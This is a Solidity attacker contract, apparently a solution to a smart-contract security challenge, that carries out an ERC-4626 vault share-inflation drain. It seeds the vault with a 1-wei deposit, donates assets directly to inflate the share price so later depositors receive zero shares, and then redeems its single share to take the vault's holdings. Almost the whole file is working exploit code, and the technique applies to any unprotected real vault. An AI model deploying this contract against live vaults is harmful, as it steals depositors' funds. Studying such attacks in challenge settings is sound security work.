// SPDX-License-Identifier: MIT
// VAULT SHARE-INFLATION DRAIN (ERC-4626 donation class).
// Technique: with supply at zero, seed it with a 1-wei deposit (1 share), then
// donate assets directly to the vault — share price = rawBalance/supply
// skyrockets. Every late depositor's share mint rounds down to zero, and their
// assets sit redeemable by our single share.
pragma solidity ^0.8.0;

import {ERC20Mintable} from "../tokens/ERC20Mintable.sol";
import {StakingVault4626} from "../challenges/StakingVault4626.sol";

contract VaultInflationAttacker {
    StakingVault4626 public immutable vault;
    ERC20Mintable public immutable asset;
    address public immutable owner;

    constructor(address _vault) {
        vault = StakingVault4626(_vault);
        asset = ERC20Mintable(vault.asset());
        owner = msg.sender;
    }

    /// Seed supply with a 1-wei deposit, then donate `donation` to the vault
    /// to inflate the share price before real depositors arrive.
    function inflate(uint256 donation) external {
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, address(this)); // supply: 1 share, 1 wei of assets
        asset.transfer(address(vault), donation); // price: ~donation per share
    }

    /// Redeem the single seeded share — it now backs the whole vault.
    function harvest() external {
        vault.redeem(vault.balanceOf(address(this)), owner, address(this));
    }

    receive() external payable {}
}
